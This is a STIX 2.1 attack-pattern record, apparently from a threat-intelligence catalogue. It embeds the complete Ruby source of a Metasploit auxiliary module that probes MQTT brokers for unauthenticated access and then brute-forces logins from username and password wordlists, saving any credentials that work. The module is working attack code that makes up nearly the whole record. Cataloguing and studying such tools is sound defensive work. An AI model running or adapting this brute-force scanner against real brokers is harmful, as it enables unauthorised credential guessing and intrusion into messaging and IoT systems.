{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14887e17-fcb4-4029-a56d-f5446c9a9633",
    "created": "2024-08-14T16:28:02.407647Z",
    "modified": "2024-08-14T16:28:02.407652Z",
    "name": "MQTT Authentication Scanner",
    "description": "( This module attempts to authenticate to MQTT. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mqtt/connect.rb",
            "external_id": "connect.rb"
        },
        {
            "source_name": "reference",
            "url": "http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Table_3.1_-"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/mqtt'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::MQTT\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'        => 'MQTT Authentication Scanner',\n      'Description' => %q(\n        This module attempts to authenticate to MQTT.\n      ),\n      'Author'      =>\n        [\n          'Jon Hart <jon_hart[at]rapid7.com>'\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Table_3.1_-']\n        ],\n      'License'     => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'BLANK_PASSWORDS' => false,\n          'USER_AS_PASS' => true,\n          'USER_FILE' => 'data/wordlists/unix_users.txt',\n          'PASS_FILE' => 'data/wordlists/unix_passwords.txt'\n        }\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def test_login(username, password)\n    client_opts = {\n      username: username,\n      password: password,\n      read_timeout: read_timeout,\n      client_id: client_id\n    }\n    connect\n    client = Rex::Proto::MQTT::Client.new(sock, client_opts)\n    connect_res = client.connect\n    client.disconnect\n    connect_res.return_code.zero?\n  end\n\n  def default_login\n    vprint_status(\"Testing without credentials\")\n    if test_login('', '')\n      print_good(\"Does not require authentication\")\n    end\n\n  end\n\n  def run_host(_ip)\n    unless default_login\n      brute\n    end\n  end\n\n  def brute\n    vprint_status(\"Starting MQTT login sweep\")\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::MQTT.new(\n      host: rhost,\n      port: rport,\n      read_timeout: datastore['READ_TIMEOUT'],\n      client_id: client_id,\n      proxies: datastore['PROXIES'],\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      connection_timeout: datastore['ConnectTimeout'],\n      max_send_size: datastore['TCP::max_send_size'],\n      send_delay: datastore['TCP::send_delay'],\n      framework: framework,\n      framework_module: self,\n      ssl: datastore['SSL'],\n      ssl_version: datastore['SSLVersion'],\n      ssl_verify_mode: datastore['SSLVerifyMode'],\n      ssl_cipher: datastore['SSLCipher'],\n      local_port: datastore['CPORT'],\n      local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n      password = result.credential.private\n      username = result.credential.public\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n        print_good(\"MQTT Login Successful: #{username}/#{password}\")\n      else\n        invalidate_login(credential_data)\n        vprint_error(\"MQTT LOGIN FAILED: #{username}/#{password} (#{result.proof})\")\n      end\n    end\n  end\nend\n"
}